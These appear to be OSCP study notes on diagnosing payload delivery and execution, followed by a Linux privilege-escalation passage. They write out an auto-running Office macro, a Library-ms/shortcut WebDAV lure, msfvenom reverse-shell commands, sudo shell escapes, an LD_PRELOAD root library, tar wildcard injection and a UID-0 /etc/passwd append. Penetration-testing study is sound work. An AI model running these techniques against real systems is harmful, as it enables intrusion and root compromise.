# Payload Execution Obstacles

[← Stage index](README.md) | [Shells and payloads](02-shells-and-payloads.md) | [File transfer](01-file-transfer.md) | [Payload-execution cheatsheet](../../cheatsheets/payload-execution.md) | [Strategy map](../../notes/Attack_Strategy_Map.md) | Study methods: [Resolve payload execution obstacles](../../notes/methods/execution.md)

> **Goal:** determine the first failed boundary between delivery and a usable session, then change only the condition responsible. Commands are generic authorized-lab references. Client-side delivery requires explicit scope and the intended exercise user interaction.

## 1. Preserve the execution chain

```text
artifact/request
→ delivered to intended consumer
→ required user/trigger action
→ parser/interpreter/loader
→ process or bounded side effect
→ network connection
→ handler protocol
→ usable session
```

| Boundary | Decisive evidence | Does not prove |
| --- | --- | --- |
| Delivery | Expected bytes, request, document or shortcut arrives intact | It was opened or parsed |
| Trigger | Intended user/service/parser consumed it | Child process started |
| Execution | Harmless marker, process or command output | Callback route works |
| Connection | Expected peer reaches listener | Payload and handler agree |
| Session | Commands return; host and identity verified | Stability or privilege |

Do not replace the artifact, payload, listener and route simultaneously. Record the last confirmed boundary and test the next one.

## 2. Fast diagnostic order

1. Reproduce a harmless direct command in the exact vulnerable or user context.
2. Confirm file/request integrity, final path and consumer.
3. Identify every parser, interpreter and loader.
4. Match target OS, process architecture, artifact format and runtime dependencies.
5. Verify permissions, working directory, execution policy and application-control evidence.
6. Start the correct listener/handler and prove its bind.
7. Prove the target-to-listener route separately.
8. Inspect concrete antimalware, application-control and process-failure evidence.
9. Repair session I/O only after a connection exists.

If step 1 fails, this is not yet a payload problem. Return to the exploit, input parser or execution primitive.

## 3. Client-side attacks are gated chains

Client-side access adds two prerequisites that service exploitation does not normally have:

- the artifact must reach the intended user and application;
- the user or application must perform the action that reaches the execution sink.

Before choosing a document or shortcut, establish the target OS, installed application/version, delivery route, expected security zone, required interaction, target egress and callback route. A generic file that depends on absent software is not a viable attack.

### 3.1 Office macro chain

Use a macro-enabled format such as `.docm` or a legacy `.doc`; `.docx` does not persist embedded VBA macros by itself. Store the macro in the document, not only the global template. A minimal harmless execution proof is:

```vb
Sub AutoOpen()
    RunProof
End Sub

Sub Document_Open()
    RunProof
End Sub

Sub RunProof()
    CreateObject("WScript.Shell").Run _
        "cmd.exe /c whoami > %TEMP%\oscp-marker.txt", 0, True
End Sub
```

`AutoOpen` and `Document_Open` cover distinct Word opening paths. Replace the proof command only after the document, trigger and execution context are confirmed.

Modern Office commonly blocks VBA macros in files carrying Mark of the Web rather than offering a universal one-click enable path. Relevant gates include:

- file format actually supports the macro;
- macro is stored in the delivered document;
- MOTW/Zone Identifier and security zone;
- Protected View and Trust Center settings;
- signed publisher or Trusted Location decisions;
- organization GPO that the user cannot override;
- user opened the document and performed the required permitted action;
- Office launched the expected child process;
- the child command survived VBA, CMD and PowerShell quoting;
- delivery and callback network paths both work.

Inspect a file's zone without changing it:

```powershell
Get-Item -LiteralPath 'C:\PATH\FILE.docm' -Stream *
Get-Content -LiteralPath 'C:\PATH\FILE.docm' -Stream Zone.Identifier
```

`ZoneId=3` represents the Internet zone. Absence of the stream does not prove that macro policy permits execution, and removing MOTW does not override every policy.

### 3.2 Windows Library file plus shortcut

A `.Library-ms` file is an XML library description that can present a remote location in Explorer. The PEN-200 attack pattern is two-stage:

```text
delivered .Library-ms
→ user opens library
→ Explorer reaches WebDAV location
→ user opens .lnk
→ shortcut launches chosen command
→ optional download/callback
```

If WsgiDAV is already installed, publish a dedicated authorized-lab directory:

```bash
mkdir -p webdav
wsgidav --host=0.0.0.0 --port=80 \
  --root=./webdav --auth=anonymous
```

> Anonymous mode exposes the selected directory. Bind only to the required lab interface when possible, place no sensitive files there and stop the server after the exercise.
> Port 80 is the reliable baseline for a plain-HTTP Windows WebDAV location. Use another port only after confirming the target WebClient accepts that URL form and the route permits it.

Original library template using placeholders:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>1</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1002</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>http://LHOST/</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Save it with a `.Library-ms` extension. Windows may add a serialized location after opening it; retain a clean source copy and inspect the final artifact before delivery.

Create a shortcut on a controlled Windows preparation host:

```powershell
$shortcutPath = 'C:\PATH\webdav\ACTION.lnk'
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = "$env:SystemRoot\System32\cmd.exe"
$shortcut.Arguments = '/c whoami > %TEMP%\oscp-marker.txt'
$shortcut.WorkingDirectory = $env:TEMP
$shortcut.IconLocation = "$env:SystemRoot\System32\imageres.dll,11"
$shortcut.Save()
```

Only after the harmless marker works, substitute a command compatible with the target and the separately proven callback route. Diagnose this chain at three independent network points:

```text
Explorer → WebDAV
shortcut command → optional payload/download server
executed payload → listener/handler
```

Failure cues:

| Observation | Next boundary |
| --- | --- |
| Library opens empty | WebDAV bind, reachability, WebClient/policy, modified library serialization |
| WebDAV receives nothing | Artifact not opened, URL/port wrong, client route or WebDAV blocked |
| Directory appears; shortcut never runs | Required second user action absent or shortcut blocked |
| Marker works; download absent | Command quoting, DNS and payload-server route |
| Download occurs; no execution | Format, permissions, policy, quarantine or dependency |
| Execution proven; no callback | Listener, route, payload/handler compatibility |

## 4. Match artifact to its consumer

The file extension is not the execution contract. Record all of these:

```text
target OS and build
target process architecture
artifact format
loader/interpreter
execution identity and integrity
working directory and PATH
required runtime/libraries
arguments and quoting
network direction
handler protocol
```

### 4.1 Linux checks

```bash
uname -a
uname -m
file PAYLOAD
readelf -h PAYLOAD | sed -n '1,25p'
ldd PAYLOAD
ls -l PAYLOAD
findmnt -T /PATH/TO/PAYLOAD
head -n 1 SCRIPT
```

Common interpretations:

- `Exec format error`: wrong format/architecture or invalid interpreter line;
- `Permission denied`: missing execute permission, inaccessible parent directory, `noexec`, policy or identity issue;
- `No such file or directory` when the file exists: missing dynamic loader or broken shebang interpreter;
- missing shared object: runtime library mismatch;
- `^M` in a shebang: CRLF line endings changed the interpreter path;
- works interactively but not through cron/service: environment, working directory, shell, identity or route differs.

### 4.2 Windows checks

```powershell
Get-CimInstance Win32_OperatingSystem |
  Select-Object Caption,Version,BuildNumber,OSArchitecture

[Environment]::Is64BitOperatingSystem
[Environment]::Is64BitProcess
$env:PROCESSOR_ARCHITECTURE
Get-AuthenticodeSignature -FilePath 'C:\PATH\PAYLOAD.exe'
```

Keep OS architecture and consumer-process architecture separate. A 64-bit OS can run a 32-bit process under WOW64; injected code and DLLs must match the process they enter. A normal executable is not necessarily a service executable, DLL, MSI or script:

| Consumer | Required property / common failure |
| --- | --- |
| Direct process creation | Compatible PE/ELF/script and dependencies |
| Windows service | Service-compatible entry/control behavior; error 1053 may follow execution of a non-service program |
| DLL loader/hijack | Correct bitness, expected exports and dependency behavior |
| `msiexec` | Valid MSI package, not an EXE renamed `.msi` |
| PowerShell | Valid syntax, edition/runtime compatibility and applicable policy/control state |
| Existing memory-corruption PoC | Documented architecture, space, bad characters and exit behavior |

## 5. Parser, command-line and length failures

Write the real chain:

```text
document/shortcut or HTTP/SQL/template input
→ application parser
→ VBA/WScript/application runtime
→ cmd.exe /c, /bin/sh -c or PowerShell
→ final command/payload
```

Start with a short marker at every layer. Check:

- quote ownership at each layer;
- expansion of `%VAR%`, `$VAR` and PowerShell variables;
- metacharacters such as `&`, `|`, `<`, `>`, `;`, backticks and parentheses;
- URL/JSON/XML/Base64 decode count;
- command-line, VBA-string, request-field or exploit-buffer length;
- current directory and relative paths.

PowerShell encoded-command preparation:

```powershell
$command = 'COMMAND'
$bytes = [Text.Encoding]::Unicode.GetBytes($command)
[Convert]::ToBase64String($bytes)
```

```cmd
powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE
```

`-EncodedCommand` uses UTF-16LE. It solves some transport/quoting problems; it is not encryption and does not establish antimalware evasion.

## 6. PowerShell control layers

Do not merge these different controls:

| Control | What it changes | Useful evidence |
| --- | --- | --- |
| Execution policy | Conditions for loading/running scripts | `Get-ExecutionPolicy -List` and exact error |
| Language mode | Available PowerShell language features | `$ExecutionContext.SessionState.LanguageMode` |
| AMSI | Submits supported script/content to antimalware | Explicit block/error plus Defender/PowerShell events |
| AppLocker/WDAC | Application/script allow policy | Effective policy and application-control events |
| Defender/other AV | File, memory, behavior and network decisions | Status, detection history, quarantine/events |
| Permissions | File/process/service/token rights | Access-denied result under named identity |

Read-only checks:

```powershell
Get-ExecutionPolicy -List
$ExecutionContext.SessionState.LanguageMode

Get-MpComputerStatus |
  Select-Object AntivirusEnabled,RealTimeProtectionEnabled,
    BehaviorMonitorEnabled,IoavProtectionEnabled,AntivirusSignatureVersion

Get-MpThreatDetection |
  Select-Object InitialDetectionTime,ThreatID,ActionSuccess,Resources

Get-AppLockerPolicy -Effective -Xml

Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' `
  -MaxEvents 50 -ErrorAction SilentlyContinue |
  Select-Object TimeCreated,Id,LevelDisplayName,Message

Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/EXE and DLL' `
  -MaxEvents 50 -ErrorAction SilentlyContinue |
  Select-Object TimeCreated,Id,Message

Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/MSI and Script' `
  -MaxEvents 50 -ErrorAction SilentlyContinue |
  Select-Object TimeCreated,Id,Message
```

Cmdlets, logs and fields vary by edition, installed modules, permissions and control product. Missing output is inconclusive.

Execution policy is defense in depth, not a Windows security boundary. A process-scoped policy setting may change script-loading behavior when GPO does not override it:

```cmd
powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\PATH\SCRIPT.ps1
```

This does not disable AMSI, application control, antimalware, permissions or network controls. Do not change persistent machine/user policy merely to test a payload.

## 7. Interpret control evidence

| Observation | Most useful next action |
| --- | --- |
| Transferred hash differs | Repair transfer/encoding before execution |
| File arrives then vanishes | Inspect quarantine/detection events and resource path |
| File remains; process creation denied | Inspect AppLocker/WDAC, permissions and parent process |
| Script-loading policy error | Inspect scope/precedence; use an authorized process-only invocation if applicable |
| Explicit AMSI/content block | Treat content/control as confirmed; encoding alone is not a supported conclusion |
| Process starts then exits | Capture exit/error, dependency and architecture evidence |
| Process remains; no connection | Test target egress, LHOST and listener |
| TCP handshake then close | Handler/payload mismatch, stage failure, crash or control interruption |

Modern protection can inspect files, scripts after decoding, process memory, behavior and network activity. Therefore:

- changing a filename does not imply a new payload;
- Base64 does not imply concealment from AMSI;
- an in-memory technique is not automatically invisible;
- an encoder is primarily useful for transport/bad-character constraints, not guaranteed AV bypass;
- a clean third-party scanner result does not prove execution on the target and may disclose a private sample.

Prefer the least complex route already supported by evidence: a direct command, native interpreter, authenticated management service or simple command shell may meet the objective without a custom binary. Deep shellcode development, process-injection implementation and generalized AV-bypass recipes are outside this speedrun.

## 8. Generate only after selecting the context

```bash
msfvenom -l payloads | grep -E 'linux|windows' | grep -E 'x64|x86'
msfvenom --list formats
msfvenom -p PAYLOAD_NAME --list-options
```

Baseline stageless command shells:

```bash
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=LHOST LPORT=LPORT \
  -f elf -o shell.elf

msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=LHOST LPORT=LPORT \
  -f exe -o shell.exe

file shell.elf shell.exe
sha256sum shell.elf shell.exe
```

Existing reviewed PoC with documented byte restrictions:

```bash
msfvenom -p PAYLOAD_NAME \
  LHOST=LHOST LPORT=LPORT \
  EXITFUNC=thread \
  -f FORMAT -v VARIABLE \
  -b 'BAD_CHARACTERS' -s MAX_SPACE
```

Use `EXITFUNC` only when the exploit/consumer requires that termination behavior. Never invent bad characters or size limits.

Staging distinction:

```text
windows/x64/shell_reverse_tcp  single/stageless
windows/x64/shell/reverse_tcp  staged
```

A staged payload first connects and asks its handler for the larger stage. A raw Netcat listener cannot supply that protocol.

## 9. multi/handler and session lifecycle

Matching handler:

```text
msfconsole -q
use exploit/multi/handler
set PAYLOAD PAYLOAD_NAME
set LHOST LHOST
set LPORT LPORT
set ExitOnSession false
show options
run -j
```

Manage the resulting job/session deliberately:

```text
jobs -l
sessions -l
sessions -i SESSION_ID
background
sessions -k SESSION_ID
jobs -k JOB_ID
```

`ExitOnSession false` keeps the handler available after a session opens. `run -j` backgrounds the handler. A session ID is local to that framework instance; record the target, identity, payload and listener rather than relying on the number alone.

Handler failure cues:

| Output | Interpretation |
| --- | --- |
| Handler never binds | Bad local address, occupied port or privilege issue |
| Raw listener receives connection; framework does not | Different port/interface or payload transport |
| Handler receives connection but no session | Exact payload/stager mismatch, stage blocked or crash |
| Session opens then dies | Parent exits, payload exit behavior, route/control or process crash |
| Session opens as unexpected architecture/type | Default payload or target was not explicitly selected |

## 10. Metasploit module workflow and exam boundary

Manual module inspection:

```text
search type:exploit cve:CVE_ID
info MODULE_PATH
use MODULE_PATH
show options
show advanced
show targets
show payloads
set RHOSTS TARGET
set RPORT PORT
set TARGET TARGET_ID
set PAYLOAD PAYLOAD_NAME
set LHOST LHOST
set LPORT LPORT
show missing
run
```

Interpretation rules:

- module rank describes expected exploit stability, not target vulnerability;
- `check` is an active module operation and does not prove exploitability when unsupported or inconclusive;
- target IDs, default payloads and options vary by module/version;
- automatic target selection is still an assumption to verify;
- a module's success message is weaker than a verified session, host and identity;
- `setg` persists values across modules and can silently aim later work at the wrong host; prefer local `set` unless global state is intentionally tracked.

Current OSCP+ restriction:

- `msfvenom` and `exploit/multi/handler` may be used against all targets, except that a Meterpreter payload remains subject to the one-target limit;
- any Metasploit Auxiliary, Exploit or Post module—or Meterpreter payload—locks the selection to one target, even if `check` or the attack fails;
- Metasploit pivoting is prohibited;
- automatic exploitation tools are prohibited.

Use manual/source-reviewed exploitation as the reusable baseline. Decide on the restricted Metasploit target deliberately and record that decision before using a restricted module or Meterpreter.

## 11. Worked diagnostic paths

### A. Document delivered, no callback

```text
Observed: document exists
Unknown: opened, macro permitted, child command, network route
Test: MOTW/policy → harmless marker → child process/download → callback route
Action: repair first failed gate; do not regenerate the payload first
```

### B. Executable disappears after transfer

```text
Observed: transfer response succeeded
Test: destination listing/hash → Defender detection/resource/event
Interpretation: transfer success is not retention; quarantine requires evidence
Action: choose a justified alternate execution form or native route, within scope
```

### C. PowerShell says scripts are disabled

```text
Observed: explicit execution-policy error
Test: Get-ExecutionPolicy -List and GPO precedence
Action: use a process-scoped invocation if allowed; do not call this an AMSI result
```

### D. Connection reaches Netcat but there is no shell

```text
Observed: TCP connection
Test: generated payload name
Interpretation: staged payload may have reached a raw listener
Action: use exact multi/handler or generate a compatible stageless command shell
```

### E. Binary exists but returns “not found” on Linux

```text
Observed: path and file exist
Test: file, readelf interpreter, ldd, shebang
Interpretation: loader/interpreter dependency may be missing
Action: build/choose a compatible artifact; do not change callback settings
```

### F. Metasploit module reports completion, no session

```text
Observed: module ran
Test: exact target profile, payload, callback route, handler output and service state
Interpretation: completion is not verified execution/session
Action: preserve module output and diagnose the first missing state
```

## 12. Evidence and cleanup

Record:

- source and hash of the original artifact or exploit;
- exact changes and payload-generation command;
- delivery path and resulting hash;
- required user/trigger action;
- OS, process architecture, format and runtime assumptions;
- handler payload, bind and route;
- security-control errors/events used for diagnosis;
- verified host, identity and session type;
- listener/job/process/artifact cleanup.

Remove temporary documents, shortcuts, WebDAV content, payloads, handler jobs and policy changes created for the authorized exercise. Do not claim AV evasion, user execution or a session without observed evidence.

## Tooling for this section

| Tool | Purpose | Required context | Baseline | Decisive output | Failure cue |
| --- | --- | --- | --- | --- | --- |
| `file`/`readelf`/`ldd` | Validate Linux format, architecture and runtime | Local artifact or target shell | Section 4.1 | Matching format/interpreter/libraries | Existing file returns loader error |
| PowerShell built-ins | Inspect architecture, zone, policy and logs | Windows command execution; permissions vary | Sections 3–7 | Specific policy/status/event | Missing cmdlet/log is inconclusive |
| WsgiDAV | Conditional WebDAV stage for Library-file exercise | Installed server, permitted bind and client route | Section 3.2 | OPTIONS/GET and Explorer access | Empty library or no server request |
| `msfvenom` | Generate a selected payload representation | Known OS/arch/format/staging/route | Section 8 | Expected metadata and artifact | Successful generation alone proves nothing on target |
| `multi/handler` | Receive exact framework/staged protocol | Matching payload and reachable listener | Section 9 | Expected session opens | Connection without session implies mismatch/stage failure |
| Netcat/Ncat | Raw listener and simple socket proof | Compatible raw command shell or test connection | Related shell procedure | Expected peer and usable I/O | Cannot stage a framework payload |
| `tcpdump`/packet capture | Localize connection boundary | Capture permission and correct interface | `tcpdump -ni any tcp port LPORT` | SYN/handshake/close sequence | No packet cannot by itself identify earlier failed layer |

## Sources

- Supplied PEN-200, Chapter 12 pp. 343–374, selected Chapter 15 pp. 416–441, and Chapter 21 pp. 653–704.
- [Current OSCP+ Body of Knowledge](https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge) and [exam guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)
- [Microsoft: macros from the Internet are blocked by default](https://learn.microsoft.com/en-us/DeployOffice/security/internet-macros-blocked)
- [Microsoft Library Description schema](https://learn.microsoft.com/en-us/windows/win32/shell/library-schema-entry)
- [PowerShell execution policies](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies) and [security features](https://learn.microsoft.com/en-us/powershell/scripting/security/security-features)
- [Microsoft Defender status](https://learn.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus), [threat history](https://learn.microsoft.com/en-us/powershell/module/defender/get-mpthreatdetection) and [event logs](https://learn.microsoft.com/en-us/defender-endpoint/troubleshoot-mdav-scan-issues)
- [Microsoft `Get-AppLockerPolicy`](https://learn.microsoft.com/en-us/powershell/module/applocker/get-applockerpolicy)
- [Metasploit payloads](https://docs.rapid7.com/metasploit/working-with-payloads), [module workflow](https://docs.rapid7.com/metasploit/modules/) and [msfvenom](https://github.com/rapid7/metasploit-framework/blob/master/docs/metasploit-framework.wiki/How-to-use-msfvenom.md)
- [WsgiDAV](https://github.com/mar10/wsgidav)
- [getSH Useful Stuff and Tool Cheatsheet](https://lizajose.github.io/getSH/useful-stuff), source snapshot [`e1f62dd`](https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98)
- [Hexdump OSCP repository](https://github.com/LeonardoE95/OSCP): live index includes Metasploit, Word macro, Windows Library-file and AMSI resources. The narrow mechanics above were checked against current official sources; the dedicated AMSI-bypass resource was not imported because deep bypass development is outside this speedrun.

# Stage 04: Shells, Transfers and Credentials

[← Main index](../../README.md) | [Strategy map](../../notes/Attack_Strategy_Map.md) | Study methods: [Map useful web behavior](../../notes/methods/web-mapping.md); [Recover and use authentication material](../../notes/methods/credentials.md); [Select and adapt public exploits](../../notes/methods/public-exploits.md); [Establish sessions and move files](../../notes/methods/sessions-transfers.md); [Escalate privileges on Linux](../../notes/methods/linux-privesc.md); [Gain a more useful domain identity](../../notes/methods/ad-identities.md); [Resolve payload execution obstacles](../../notes/methods/execution.md); [Escalate privileges on Windows](../../notes/methods/windows-privesc.md)

> **Purpose:** make execution usable, move tools/evidence through an explicitly understood route, and classify/recover/test authentication material without confusing authentication with authorization.

| Task | Use it to |
| --- | --- |
| [File transfer](01-file-transfer.md) | Serve or copy tools to Linux/Windows targets and retrieve output through HTTP, SSH, SMB, Netcat or encoded text |
| [Shells and payloads](02-shells-and-payloads.md) | Choose direct/reverse/bind/authenticated access, match payload format/architecture, repair a session and diagnose callbacks |
| [Credential use and cracking](03-credential-use-and-cracking.md) | Classify passwords, keys, hashes, responses and tickets; crack supported material and validate compatible reuse |
| [File and repository hunting](04-file-and-repository-hunting.md) | Inspect exposed Git metadata/history and search scoped Linux/Windows paths for configuration or secret candidates |
| [Python tool environments](05-python-tool-environments.md) | Isolate source-tool dependencies from system Python and record a reproducible environment |
| [Payload execution obstacles](06-payload-execution-obstacles.md) | Diagnose client-side delivery, format/architecture/runtime, PowerShell/security controls, handlers and restricted Metasploit use |

> **Exit condition:** the session or credential transition is verified under a named host/identity/context; transfer direction/integrity and authentication/authorization boundaries are recorded; the new state is re-enumerated.

# Linux Privilege Escalation [← Stage index](README.md) | [Quick sheet](../../cheatsheets/linux-privesc.md) | [Master Notes](../../notes/Master_Notes.md#linux-selection-logic) | [File transfer](../04-shells-transfers-credentials/01-file-transfer.md) | [Strategy map](../../notes/Attack_Strategy_Map.md) | Study methods: [Escalate privileges on Linux](../../notes/methods/linux-privesc.md) > **Model:** controlled object → effective permission → privileged consumer → execution identity → trigger → effect → verified identity. > **First pass:** confirm the session identity, run the [LinPEAS baseline](#14-automated-enumeration-generate-then-prove) early, then verify its exact finding. For short-lived scheduled commands use [pspy](#6-cron-timers-and-services) and inspect the consumed path. > **Reuse discovery:** repeating an inventory is optional when equivalent complete output is available from the same host and identity. Check the LinPEAS build/options, skipped checks and errors. Keep selected-candidate validation: exact effective permissions, privileged consumer, trigger and verified outcome. Re-enumerate affected resources after access changes; absence from a report does not rule a path out. The [quick sheet](../../cheatsheets/linux-privesc.md) marks reusable discovery and follow-up checks per investigation. ## 1. Establish current state > **Decisive output:** current identity/groups, OS/kernel/architecture, network position, root-owned activity, mounts and exact sudo rules. ```bash hostname; id; groups uname -a; cat /etc/os-release; getconf LONG_BIT pwd; umask; env ip addr; ip route; ss -lntup; ss -lxnp ps auxf mount; findmnt; lsblk; df -hT sudo -n -l 2>&1 sudo -l ``` ```bash getent passwd awk -F: '$3 == 0 || $7 !~ /(nologin|false)$/ {print $1,$3,$4,$6,$7}' /etc/passwd ``` > **Priority:** credentials/sudo → root-consumed writable objects → SUID/capabilities → privileged groups/mounts/local services → PATH/libraries/wildcards → software/kernel. ## 2. Prove permissions, including parents and mounts ```bash namei -l /PATH/TO/OBJECT stat /PATH/TO/OBJECT /PATH/TO/PARENT getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT 2>/dev/null findmnt -T /PATH/TO/OBJECT -o TARGET,SOURCE,FSTYPE,OPTIONS ``` > Directory write+execute can permit replacement even when the file is not writable. ACLs can add/remove effective access. `nosuid` defeats SUID/SGID and file-capability effects; `noexec` blocks direct execution; `ro` blocks changes. Discover writable objects, then prioritize root-owned configuration, scripts, binaries and parents under `/etc`, `/opt`, `/usr/local`, application paths and service working directories: ```bash find / -xdev -type f -writable -ls 2>/dev/null find / -xdev -type d -writable -ls 2>/dev/null ``` ## 3. Hunt credentials and service trails ```bash history 2>/dev/null find /home /root -maxdepth 3 -type f \ \( -name '.*history' -o -name '*.conf' -o -name '*.ini' -o -name '*.env' \ -o -name 'id_*' -o -name '*.pem' -o -name '*.key' -o -name '*.bak' \) \ -readable 2>/dev/null grep -RniE 'pass(word)?|secret|token|api[_-]?key|connection(string)?' \ /var/www /opt /srv /etc 2>/dev/null | head -n 200 ``` Inspect process arguments and readable process environment: ```bash ps auxww ps eww -u root 2>/dev/null tr '\0' ' ' < /proc/PID/cmdline 2>/dev/null; echo tr '\0' '\n' < /proc/PID/environ 2>/dev/null ``` Check reusable local sessions/agents only when their sockets are accessible: ```bash w; who; last -n 20 env | grep -E 'SSH_AUTH_SOCK|TMUX|STY' tmux ls 2>/dev/null screen -ls 2>/dev/null find /tmp /run -maxdepth 3 -type s -ls 2>/dev/null ``` > An agent, tmux/screen or daemon socket needs effective socket access and a useful authenticated/privileged session. Presence alone is not session hijacking. > **Next:** identify the value's user/service context, validate the smallest relevant transition (`su`, `sudo`, SSH or application authentication), then re-enumerate. Use [credential handling](../04-shells-transfers-credentials/03-credential-use-and-cracking.md) for cracking/reuse. ## 4. Sudo: parse the complete rule ```bash sudo -n -l 2>&1 sudo -l sudo --version ``` Record the run-as identity, password tag, executable path, argument constraints/wildcards and `SETENV`/`NOSETENV`/`env_keep`/`secure_path`/`NOEXEC`. Match the exact mode under [GTFOBins](https://gtfobins.github.io/). ```bash sudo /usr/bin/find . -exec /bin/sh \; -quit sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}' sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")' ``` > Use an example only when the entire rule permits it. Restricted arguments, another path/build, privilege dropping, `NOEXEC`, a non-root run-as user or MAC policy can invalidate the escape.
Preserved LD_PRELOAD variant > Requires an explicitly allowed/preserved variable and a dynamically linked allowed program. ```bash sudo -l | grep -E 'SETENV|env_keep.*LD_PRELOAD' ``` ```c #include #include void _init(void) { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/sh"); } ``` ```bash gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c sudo LD_PRELOAD=/tmp/preload.so /ALLOWED/PROGRAM ``` > Static linking, secure-loader behavior, missing environment permission or MAC denial disproves this route.
## 5. SUID, SGID and capabilities ```bash find / -xdev -type f -perm -4000 -ls 2>/dev/null find / -xdev -type f -perm -2000 -ls 2>/dev/null getcap -r / 2>/dev/null ``` Rank nonstandard/custom paths, unexpected versions, writable binaries/parents and dangerous interpreters. Inspect one candidate: ```bash namei -l /PATH/TO/BINARY stat /PATH/TO/BINARY file /PATH/TO/BINARY readelf -d /PATH/TO/BINARY 2>/dev/null | grep -E 'RPATH|RUNPATH|NEEDED' ldd /PATH/TO/BINARY 2>/dev/null strings /PATH/TO/BINARY | head -n 150 dpkg -S /PATH/TO/BINARY 2>/dev/null rpm -qf /PATH/TO/BINARY 2>/dev/null ``` > Look for a documented SUID/capability primitive, unsafe relative helper, arbitrary file operation, user-controlled config/plugin or exact vulnerable version. Normal distribution SUID files are not findings by themselves.
Capability interpretation and example High-value capability candidates include `cap_setuid`, `cap_setgid`, `cap_dac_override`, `cap_dac_read_search`, `cap_sys_ptrace`, `cap_sys_admin`, `cap_setfcap` and `cap_sys_module`. `cap_net_raw` is usually not a direct root transition. ```bash capsh --print 2>/dev/null grep '^Cap' /proc/self/status ``` Only when the exact interpreter has effective `cap_setuid`: ```bash /PATH/TO/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")' ``` > `+ep` indicates permitted plus the file effective bit. Bounding sets, namespaces, `nosuid` mounts and program behavior can still change the result.
## 6. Cron, timers and services ```bash crontab -l 2>/dev/null cat /etc/crontab cat /etc/anacrontab 2>/dev/null atq 2>/dev/null ls -la /etc/cron.* /var/spool/cron 2>/dev/null grep -RniE 'CRON|CMD' /var/log/syslog /var/log/cron* 2>/dev/null | tail -n 100 systemctl list-timers --all systemctl list-unit-files --type=service systemctl list-units --type=service --state=running systemctl cat UNIT systemctl show UNIT -p User -p Group -p ExecStart -p WorkingDirectory -p EnvironmentFiles ``` Observe short-lived commands: ```bash ./pspy64 ./pspy64 -pf -i 1000 ``` Validate every referenced script, binary, configuration, environment file, plugin and parent: ```bash namei -l /PATH/TO/OBJECT stat /PATH/TO/OBJECT /PATH/TO/PARENT getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT 2>/dev/null ``` > **Prove:** exact object is controllable → job/service consumes it → process runs as a higher identity → schedule/restart/other trigger is available. A writable unit still needs a privileged reload/restart or automatic trigger. Cron uses a different/minimal environment. Apply the same proof to backup, logrotate, package-maintenance and custom housekeeping hooks: configuration visibility or a writable output is insufficient unless a higher-privileged consumer interprets attacker-controlled input. ## 7. PATH and relative-command hijacking ```bash echo "$PATH" | tr ':' '\n' echo "$PATH" | tr ':' '\n' | while IFS= read -r d; do [ -z "$d" ] && d=. [ -w "$d" ] && ls -ld "$d" done strings /PATH/TO/PRIVILEGED_BINARY | grep -E '(^|[^/])(cp|tar|service|sh|bash|cat)( |$)' ``` If the privileged consumer resolves `helper` through a controllable PATH: ```bash printf '#!/bin/sh\n/usr/bin/id > /tmp/path-proof\n' > /WRITABLE/DIR/helper chmod 700 /WRITABLE/DIR/helper PATH=/WRITABLE/DIR:$PATH /PATH/TO/TRIGGER cat /tmp/path-proof ``` > Requires a relative command, the consumer's effective PATH, an earlier writable directory, trigger and retained privilege. Your interactive PATH alone is inconclusive. ## 8. Wildcard and option injection ```bash grep -RniE 'tar .+\*|chown .+\*|chmod .+\*|rsync .+\*' \ /etc/cron* /etc/systemd /opt /usr/local 2>/dev/null ``` GNU tar proof, only when a privileged job executes compatible `tar ... *` in an attacker-writable directory: ```bash printf '#!/bin/sh\n/usr/bin/id > /tmp/wildcard-proof\n' > proof.sh chmod 700 proof.sh touch -- '--checkpoint=1' touch -- '--checkpoint-action=exec=sh proof.sh' ``` > Confirm working directory, wildcard placement, utility implementation/options, privileged identity and trigger. Do not assume every wildcard or utility accepts filename-derived options. ## 9. Writable account/policy files ```bash ls -l /etc/passwd /etc/shadow /etc/sudoers namei -l /etc/passwd getfacl -p /etc/passwd 2>/dev/null ```
Writable /etc/passwd — authorized disposable lab only ```bash cp /etc/passwd /tmp/passwd.backup HASH=$(openssl passwd -6 'TEMP_PASSWORD') printf 'root2:%s:0:0:root:/root:/bin/bash\n' "$HASH" >> /etc/passwd su - root2 id ``` > Preserve a known-good copy and restore it. UID/GID 0 creates a superuser. Do not risk corrupting a host when no safe recovery exists.
Also inspect effective access to `/etc/sudoers.d`, PAM, SSH authorized-key locations and root-executed startup/configuration files. ## 10. Privileged groups, sockets and containers ```bash id ls -l /var/run/docker.sock /run/docker.sock 2>/dev/null docker version 2>/dev/null lxc list 2>/dev/null ``` Group candidates include `docker`, `lxd`/`lxc`, `disk`, `shadow`, `adm`, `systemd-journal` and `libvirt`. Prove the associated resource and effective permission.
